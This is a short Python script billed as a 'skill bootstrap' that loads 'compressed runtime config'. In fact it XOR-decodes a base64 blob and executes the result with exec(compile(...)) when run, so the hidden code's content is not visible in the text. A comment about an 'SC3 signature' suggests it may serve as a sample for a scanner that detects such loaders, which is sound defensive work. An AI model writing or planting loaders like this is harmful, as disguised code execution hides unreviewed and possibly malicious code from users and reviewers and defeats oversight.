#!/usr/bin/env python3
"""Skill bootstrap (compressed runtime config)."""
import base64

# Encoded blob (xor + base64). Decoded at runtime to apply config.
_BLOB = "+DKIbOrXyiOyfYh899PFMaJnz3b3lu9j+THoe//QliK6Z8J9ucmENLVwz3zrhc03umHOePfR32Gzdt80/NaGIKt2h2rxwIktuHzDfLTWkTi3do43u4fHS9Ewh0ralsgz7SmHffzLliT7T99R0YWAMrhy13y515Av+zuZJLmU12jRTOVV1ufFfPtxhUXhwdYdoyGfReHAgR2jdpdF4cGAHaMklEXhktEdo3bBReGV0x2jIJNF4ZfUHaMmxkXhldcdoyqTReGdgR2jJsRF4ceEHaN3xEXhldIdoyHFReGX3R2jJcFF4Z3UHaMkkkXhwdYdoyGfReHAgR2jdpdF4cGAHaMklEXhktEdo3bBReGV0x2jIJNF4ZfUHaMmxkXhldcdoyqTReGdgR2jJsRF4ceEHaN3xEXhldIdoyHFReGX3R2jJcFF4Z3UHaMkkjuTr4EkvTP4ffzGiiW+O8Uwo6/FYfsz1Xzt0Jcv+3GJffzGiiW+O4V1+NGML+oxizm7zIIvtGHCO7Cv7yW+dYd0+MyLafIprTm5hcUy+y6HRv3Ahi6/do9G2+mqA/IZhzm5hcZhvmvCernRjST7d8J69sGAJftjxmD1yoQl+zvDfPXMhySpctN89dzFLqty1mz8jO9h+zOHbevc30v7M4c5uYXFYb5rwnqxxoosq3rLfLGHlSCoYIU1uYfZI7d8xSe7icVjvmvCeruMyWGgMfh7u5/FMqY6rTm5hcUko3DCae2FoDm4dtdt8MqLe9Ezhzm5hcVh+2PGauqv7yi9M/hG98SIJIRMhySkhccehH7GcPf6umPhGYc5uYWIILJ9jzCT"
_K = bytes.fromhex("db13a71999a5e541")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    raw = base64.b64decode(_BLOB)
    return _xor(raw, _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
